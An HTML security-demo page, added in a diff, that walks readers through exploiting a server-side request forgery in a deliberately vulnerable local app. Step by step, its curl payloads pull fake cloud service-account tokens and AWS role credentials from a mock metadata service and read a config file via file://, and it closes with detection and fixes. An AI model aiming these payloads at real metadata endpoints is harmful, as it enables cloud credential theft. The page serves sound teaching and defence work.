@@ -1,0 +1,410 @@
+<title>SSRF Exploit Runbook</title>
+<meta name="description" content="Run the Corefile SSRF exploit yourself — a hands-on walkthrough from a benign fetch to cloud service-account token theft." />
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600;700&display=swap" />
+<style>
+  :root {
+    --bg: #f4f6f9;
+    --surface: #ffffff;
+    --surface-2: #eef1f6;
+    --line: #dde2ea;
+    --text: #1b2230;
+    --dim: #5a6577;
+    --accent: #a45c00;
+    --accent-soft: rgba(164,92,0,.10);
+    --danger: #c02f2f;
+    --danger-soft: rgba(192,47,47,.09);
+    --ok: #1c8a5b;
+    /* Terminals are dark in both themes — a deliberate single look. */
+    --code-bg: #0b0e14;
+    --code-text: #e8edf5;
+    --code-line: #1e2634;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root:not([data-theme="light"]) {
+      --bg: #0d1017;
+      --surface: #141922;
+      --surface-2: #1a212d;
+      --line: #27303f;
+      --text: #e6ebf2;
+      --dim: #8b97ab;
+      --accent: #ffb454;
+      --accent-soft: rgba(255,180,84,.10);
+      --danger: #ff6b6b;
+      --danger-soft: rgba(255,107,107,.10);
+      --ok: #5ad19a;
+    }
+  }
+  :root[data-theme="dark"] {
+    --bg: #0d1017;
+    --surface: #141922;
+    --surface-2: #1a212d;
+    --line: #27303f;
+    --text: #e6ebf2;
+    --dim: #8b97ab;
+    --accent: #ffb454;
+    --accent-soft: rgba(255,180,84,.10);
+    --danger: #ff6b6b;
+    --danger-soft: rgba(255,107,107,.10);
+    --ok: #5ad19a;
+  }
+
+  * { box-sizing: border-box; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: "IBM Plex Sans", system-ui, sans-serif;
+    line-height: 1.6;
+    margin: 0;
+  }
+  .wrap { max-width: 860px; margin: 0 auto; padding: 0 24px 96px; }
+  code, kbd { font-family: "IBM Plex Mono", ui-monospace, monospace; }
+
+  /* ---- header ---- */
+  header.top {
+    display: flex; align-items: flex-start; justify-content: space-between;
+    gap: 20px; padding: 40px 0 8px;
+  }
+  .eyebrow {
+    font-family: "IBM Plex Mono", monospace; font-size: 12px; font-weight: 600;
+    letter-spacing: 2px; text-transform: uppercase; color: var(--accent);
+    margin: 0 0 10px;
+  }
+  h1 {
+    font-family: "IBM Plex Mono", monospace; font-weight: 700;
+    font-size: clamp(28px, 5vw, 42px); line-height: 1.1; margin: 0;
+    text-wrap: balance; letter-spacing: -.5px;
+  }
+  .tagline { color: var(--dim); font-size: 17px; margin: 14px 0 0; max-width: 60ch; }
+  .toggle {
+    flex: none; font-family: "IBM Plex Mono", monospace; font-size: 12px;
+    background: var(--surface); color: var(--dim); border: 1px solid var(--line);
+    border-radius: 8px; padding: 8px 12px; cursor: pointer;
+  }
+  .toggle:hover { color: var(--text); border-color: var(--accent); }
+
+  /* ---- safety banner ---- */
+  .safety {
+    display: flex; gap: 12px; align-items: flex-start;
+    background: var(--accent-soft); border: 1px solid var(--accent);
+    border-radius: 12px; padding: 14px 16px; margin: 28px 0 8px;
+    font-size: 14px;
+  }
+  .safety strong { color: var(--accent); }
+  .safety .ic { font-size: 18px; line-height: 1.4; }
+
+  /* ---- sections ---- */
+  section { margin-top: 44px; }
+  h2 {
+    font-family: "IBM Plex Mono", monospace; font-size: 13px; font-weight: 600;
+    letter-spacing: 1.5px; text-transform: uppercase; color: var(--dim);
+    margin: 0 0 18px; padding-bottom: 10px; border-bottom: 1px solid var(--line);
+  }
+  h2 .n { color: var(--accent); }
+  p { margin: 0 0 14px; }
+  a { color: var(--accent); }
+  .lead { font-size: 16px; }
+
+  /* ---- prereqs ---- */
+  .prereqs { display: flex; flex-wrap: wrap; gap: 10px; margin: 0 0 8px; padding: 0; list-style: none; }
+  .prereqs li {
+    font-family: "IBM Plex Mono", monospace; font-size: 13px; color: var(--dim);
+    background: var(--surface-2); border: 1px solid var(--line);
+    border-radius: 7px; padding: 6px 11px;
+  }
+
+  /* ---- setup cards ---- */
+  .setup { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+  @media (max-width: 620px) { .setup { grid-template-columns: 1fr; } }
+  .term-card {
+    background: var(--surface); border: 1px solid var(--line);
+    border-radius: 12px; padding: 16px; display: flex; flex-direction: column;
+  }
+  .term-card .role {
+    font-family: "IBM Plex Mono", monospace; font-size: 12px; font-weight: 600;
+    color: var(--accent); letter-spacing: .5px; margin: 0 0 4px;
+  }
+  .term-card .what { font-size: 13.5px; color: var(--dim); margin: 0 0 12px; }
+
+  /* ---- step cards ---- */
+  .step {
+    background: var(--surface); border: 1px solid var(--line);
+    border-radius: 14px; padding: 22px 22px 8px; margin-bottom: 18px;
+    position: relative;
+  }
+  .step.payoff { border-color: var(--danger); box-shadow: inset 3px 0 0 var(--danger); }
+  .step-head { display: flex; align-items: baseline; gap: 14px; margin-bottom: 6px; }
+  .step-num {
+    font-family: "IBM Plex Mono", monospace; font-weight: 700; font-size: 15px;
+    color: var(--bg); background: var(--accent);
+    min-width: 30px; height: 30px; border-radius: 8px;
+    display: inline-flex; align-items: center; justify-content: center; flex: none;
+  }
+  .step.payoff .step-num { background: var(--danger); }
+  .step-title { font-size: 18px; font-weight: 600; margin: 0; line-height: 1.3; }
+  .step-body { padding-left: 44px; }
+  @media (max-width: 520px) { .step-body { padding-left: 0; } }
+  .badge {
+    font-family: "IBM Plex Mono", monospace; font-size: 10.5px; font-weight: 600;
+    letter-spacing: .6px; text-transform: uppercase; padding: 3px 8px;
+    border-radius: 5px; vertical-align: middle; margin-left: 8px;
+  }
+  .badge.crit { color: var(--danger); background: var(--danger-soft); border: 1px solid var(--danger); }
+
+  /* ---- code blocks (always dark: a terminal) ---- */
+  .cmd {
+    position: relative; background: var(--code-bg); border: 1px solid var(--code-line);
+    border-radius: 10px; margin: 12px 0; overflow: hidden;
+  }
+  .cmd-bar {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 7px 12px; border-bottom: 1px solid var(--code-line);
+  }
+  .cmd-bar .dots { display: flex; gap: 6px; }
+  .cmd-bar .dots i { width: 10px; height: 10px; border-radius: 50%; display: block; }
+  .cmd-bar .dots i:nth-child(1) { background: #ff5f57; }
+  .cmd-bar .dots i:nth-child(2) { background: #febc2e; }
+  .cmd-bar .dots i:nth-child(3) { background: #28c840; }
+  .cmd-bar .who { font-family: "IBM Plex Mono", monospace; font-size: 11px; color: #7f8da3; }
+  .copy {
+    font-family: "IBM Plex Mono", monospace; font-size: 11px; color: #c3ccdb;
+    background: #1c2534; border: 1px solid #2b3547; border-radius: 6px;
+    padding: 4px 10px; cursor: pointer;
+  }
+  .copy:hover { border-color: var(--accent); color: #fff; }
+  .copy.done { color: var(--ok); border-color: var(--ok); }
+  pre {
+    margin: 0; padding: 14px 16px; overflow-x: auto;
+    font-family: "IBM Plex Mono", monospace; font-size: 13.5px; line-height: 1.65;
+    color: var(--code-text); white-space: pre;
+  }
+  pre .p { color: #ffb454; }        /* prompt / cmd */
+  pre .u { color: #6fb3ff; }        /* url path */
+  pre .c { color: #7f8da3; }        /* comment */
+
+  /* ---- output ---- */
+  .out { margin: 6px 0 14px; }
+  .out-label {
+    font-family: "IBM Plex Mono", monospace; font-size: 11px; font-weight: 600;
+    letter-spacing: .6px; text-transform: uppercase; color: var(--ok);
+    display: flex; align-items: center; gap: 7px; margin-bottom: 6px;
+  }
+  .out-label::before { content: ""; width: 8px; height: 8px; border-radius: 50%; background: var(--ok); }
+  .out pre {
+    background: var(--code-bg); border: 1px solid var(--code-line);
+    border-left: 3px solid var(--ok); border-radius: 8px; font-size: 13px;
+  }
+  .step.payoff .out pre { border-left-color: var(--danger); }
+
+  .note {
+    font-size: 13.5px; color: var(--dim); background: var(--surface-2);
+    border-radius: 8px; padding: 11px 14px; margin: 12px 0 16px;
+  }
+  .note b { color: var(--text); }
+
+  /* ---- explainer grid ---- */
+  .why { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+  @media (max-width: 620px) { .why { grid-template-columns: 1fr; } }
+  .why-item {
+    background: var(--surface); border: 1px solid var(--line);
+    border-radius: 12px; padding: 16px 18px;
+  }
+  .why-item h3 {
+    font-family: "IBM Plex Mono", monospace; font-size: 14px; margin: 0 0 6px; color: var(--accent);
+  }
+  .why-item p { font-size: 14px; color: var(--dim); margin: 0; }
+
+  .fix { list-style: none; padding: 0; margin: 0; }
+  .fix li {
+    padding: 12px 0 12px 30px; border-bottom: 1px solid var(--line); position: relative;
+    font-size: 15px;
+  }
+  .fix li:last-child { border-bottom: none; }
+  .fix li::before {
+    content: "→"; position: absolute; left: 4px; color: var(--ok); font-family: "IBM Plex Mono", monospace;
+  }
+  .fix b { font-family: "IBM Plex Mono", monospace; font-weight: 600; }
+
+  footer {
+    margin-top: 56px; padding-top: 20px; border-top: 1px solid var(--line);
+    font-size: 13px; color: var(--dim);
+  }
+  footer code { color: var(--accent); font-size: 12px; }
+  :focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; border-radius: 4px; }
+  @media (prefers-reduced-motion: reduce) { * { transition: none !important; } }
+</style>
+
+<div class="wrap">
+  <header class="top">
+    <div>
+      <p class="eyebrow">Corefile · Hands-on security demo</p>
+      <h1>SSRF Exploit Runbook</h1>
+      <p class="tagline">Turn a harmless "fetch a file by URL" feature into theft of a cloud workload's identity — on your own laptop, in about five minutes.</p>
+    </div>
+    <button class="toggle" id="themeBtn" type="button">◐ theme</button>
+  </header>
+
+  <div class="safety">
+    <span class="ic">⚠️</span>
+    <div><strong>Safe by design.</strong> Everything here runs on <code>127.0.0.1</code> against an intentionally vulnerable demo app. Every credential the exploit "steals" is a randomly generated fake in a real format — none maps to a live account. Do not deploy the app or run this against anything you don't own.</div>
+  </div>
+
+  <section>
+    <h2>What this shows</h2>
+    <p class="lead">A <b>Server-Side Request Forgery</b> (SSRF, CWE-918) lets an attacker make the <em>server</em> issue requests on their behalf. Because the server sits inside the trust boundary, those requests reach places the attacker can't — internal services and, most damagingly, the <b>cloud instance-metadata endpoint</b> that hands out the workload's credentials.</p>
+    <p>Corefile has an "Attach remote corefile" feature: paste a URL to a symbol server or a teammate's shared dump, and Corefile fetches it for you. It never checks <em>where</em> the URL points and returns the response body — so you can steer it anywhere and read what comes back.</p>
+    <ul class="prereqs">
+      <li>Python 3</li>
+      <li>curl</li>
+      <li>the corefile repo, checked out</li>
+      <li>~5 minutes</li>
+    </ul>
+  </section>
+
+  <section>
+    <h2><span class="n">§</span> Setup — two terminals</h2>
+    <div class="setup">
+      <div class="term-card">
+        <p class="role">Terminal A — the target</p>
+        <p class="what">A stand-in for the cloud metadata service (<code>169.254.169.254</code>), which you can't reach from a laptop. It logs each request, so you can watch the SSRF land.</p>
+        <div class="cmd">
+          <div class="cmd-bar"><div class="dots"><i></i><i></i><i></i></div><span class="who">metadata mock · :8081</span></div>
+          <pre><span class="p">python3</span> demo/ssrf/metadata_mock.py</pre>
+        </div>
+      </div>
+      <div class="term-card">
+        <p class="role">Terminal B — Corefile</p>
+        <p class="what">The vulnerable app. Serves on <code>127.0.0.1:8000</code>. Leave it running.</p>
+        <div class="cmd">
+          <div class="cmd-bar"><div class="dots"><i></i><i></i><i></i></div><span class="who">corefile · :8000</span></div>
+          <pre><span class="p">python</span> app.py</pre>
+        </div>
+      </div>
+    </div>
+    <p class="note">You'll drive the exploit from a third terminal with <code>curl</code>. Add <code>| python3 -m json.tool</code> to any command to pretty-print the JSON. If port 8000 is busy, start Corefile on another port and adjust the URLs.</p>
+  </section>
+
+  <section>
+    <h2><span class="n">§</span> The exploit</h2>
+
+    <div class="step">
+      <div class="step-head">
+        <span class="step-num">1</span>
+        <h3 class="step-title">A benign-looking fetch</h3>
+      </div>
+      <div class="step-body">
+        <p>First use the feature as intended — point it at the mock's front page. Corefile fetches the URL <em>for</em> you.</p>
+        <div class="cmd">
+          <div class="cmd-bar"><span class="who">attacker@laptop</span><button class="copy" type="button">Copy</button></div>
+          <pre><span class="p">curl</span> -s <span class="u">'http://127.0.0.1:8000/api/fetch?url=http://127.0.0.1:8081/'</span></pre>
+        </div>
+        <p class="note">Look at <b>Terminal A</b>: the request arrives from <code>127.0.0.1</code> — <b>the server made it</b>, not you. That's the whole game. Now point the server somewhere it shouldn't go.</p>
+      </div>
+    </div>
+
+    <div class="step payoff">
+      <div class="step-head">
+        <span class="step-num">2</span>
+        <h3 class="step-title">Steal the cloud service-account token <span class="badge crit">the payoff</span></h3>
+      </div>
+      <div class="step-body">
+        <p>Aim the same feature at the metadata service. On a real cloud host this URL is <code>http://169.254.169.254/…</code> or <code>http://metadata.google.internal/…</code>; the mock serves the identical path on loopback.</p>
+        <div class="cmd">
+          <div class="cmd-bar"><span class="who">attacker@laptop</span><button class="copy" type="button">Copy</button></div>
+          <pre><span class="p">curl</span> -s <span class="u">'http://127.0.0.1:8000/api/fetch?url=http://127.0.0.1:8081/computeMetadata/v1/instance/service-accounts/default/token'</span></pre>
+        </div>
+        <div class="out">
+          <div class="out-label">the workload's token walks back to you</div>
+          <pre>{
+  "access_token": "ya29.DEMO-FAKE-DO-NOT-USE-a1B2c3D4e5F6g7H8i9J0kL...",
+  "expires_in": 3599,
+  "token_type": "Bearer"
+}</pre>
+        </div>
+        <p>That token <b>is the identity of the pod/VM</b>. With it, the attacker becomes the workload — calling whatever cloud APIs that service account is allowed to (buckets, registries, secret stores) from their own machine. Confirm whose identity it is:</p>
+        <div class="cmd">
+          <div class="cmd-bar"><span class="who">attacker@laptop</span><button class="copy" type="button">Copy</button></div>
+          <pre><span class="p">curl</span> -s <span class="u">'http://127.0.0.1:8000/api/fetch?url=http://127.0.0.1:8081/computeMetadata/v1/instance/service-accounts/default/email'</span></pre>
+        </div>
+        <div class="out">
+          <div class="out-label">identity</div>
+          <pre>corefile-forensics@corefile-demo.iam.gserviceaccount.com</pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-head">
+        <span class="step-num">3</span>
+        <h3 class="step-title">Same bug, more reach</h3>
+      </div>
+      <div class="step-body">
+        <p>SSRF is <em>reach</em>, not one URL. The same endpoint hits other clouds and other schemes — driving home why one blocked path never fixes it.</p>
+        <div class="cmd">
+          <div class="cmd-bar"><span class="who">AWS IMDSv1 role credentials</span><button class="copy" type="button">Copy</button></div>
+          <pre><span class="p">curl</span> -s <span class="u">'http://127.0.0.1:8000/api/fetch?url=http://127.0.0.1:8081/latest/meta-data/iam/security-credentials/corefile-forensics-role'</span></pre>
+        </div>
+        <div class="cmd">
+          <div class="cmd-bar"><span class="who">file:// — read a local file off the server</span><button class="copy" type="button">Copy</button></div>
+          <pre><span class="p">curl</span> -s <span class="u">"http://127.0.0.1:8000/api/fetch?url=file://$(pwd)/config.py"</span></pre>
+        </div>
+        <p class="note"><b>Bonus:</b> that last one reads Corefile's own <code>config.py</code> off disk — leaking every hardcoded secret in it — without the attacker ever seeing the source.</p>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <h2>Why it works</h2>
+    <div class="why">
+      <div class="why-item"><h3>No scheme check</h3><p><code>file://</code> and others are live, not just <code>http</code>.</p></div>
+      <div class="why-item"><h3>No host check</h3><p>Link-local <code>169.254.169.254</code> and localhost-only services are in reach.</p></div>
+      <div class="why-item"><h3>No IP validation</h3><p>A public name that resolves to a private address — or a redirect to one — still lands.</p></div>
+      <div class="why-item"><h3>Body returned</h3><p>The response comes back to the caller, turning "can reach" into "can read": full-read SSRF.</p></div>
+    </div>
+    <p class="note"><b>One honest caveat.</b> Real GCP metadata requires a <code>Metadata-Flavor: Google</code> header a URL-only SSRF can't set — so that exact path would 403 on real GCP. But <b>AWS IMDSv1</b> and most <b>internal services</b> need no such header (shown above), and many real SSRFs let the attacker influence headers too. The header and AWS IMDSv2 exist <em>because</em> of this class of bug.</p>
+  </section>
+
+  <section>
+    <h2>How it's caught &amp; fixed</h2>
+    <ul class="fix">
+      <li><b>SAST / review</b> — flags a URL fetch built from request input with no allowlist (CWE-918) before it ships.</li>
+      <li><b>DAST</b> — hits <code>/api/fetch</code> unauthenticated with a callback / metadata probe and catches it at runtime, no source needed.</li>
+      <li><b>Cloud posture</b> — least-privilege on the service account and enforced <b>IMDSv2 / metadata concealment</b> shrink the blast radius of a stolen token.</li>
+      <li><b>Fix at the sink</b> — allowlist scheme and host, resolve and reject private / link-local / loopback ranges before connecting, disable redirects, and never return the raw body.</li>
+    </ul>
+  </section>
+
+  <footer>
+    Corefile is an intentionally vulnerable demonstration target. Loopback only · fake credentials · <code>kill -11</code> to reproduce. Stop both servers with Ctrl-C when you're done.
+  </footer>
+</div>
+
+<script>
+  // Theme toggle — cycles system → light → dark, remembered per viewer.
+  const root = document.documentElement, btn = document.getElementById("themeBtn");
+  let mode = "system";
+  try { mode = localStorage.getItem("ssrf-theme") || "system"; } catch (e) {}
+  function apply() {
+    if (mode === "system") root.removeAttribute("data-theme");
+    else root.setAttribute("data-theme", mode);
+    btn.textContent = mode === "system" ? "◐ auto" : mode === "light" ? "☀ light" : "☾ dark";
+  }
+  btn.onclick = () => {
+    mode = mode === "system" ? "light" : mode === "light" ? "dark" : "system";
+    try { localStorage.setItem("ssrf-theme", mode); } catch (e) {}
+    apply();
+  };
+  apply();
+
+  // Copy buttons — grab the command text from the sibling <pre>.
+  document.querySelectorAll(".copy").forEach((b) => {
+    b.addEventListener("click", () => {
+      const pre = b.closest(".cmd").querySelector("pre");
+      const text = pre.textContent.trim();
+      navigator.clipboard.writeText(text).then(() => {
+        const old = b.textContent;
+        b.textContent = "Copied ✓"; b.classList.add("done");
+        setTimeout(() => { b.textContent = old; b.classList.remove("done"); }, 1400);
+      });
+    });
+  });
+</script>
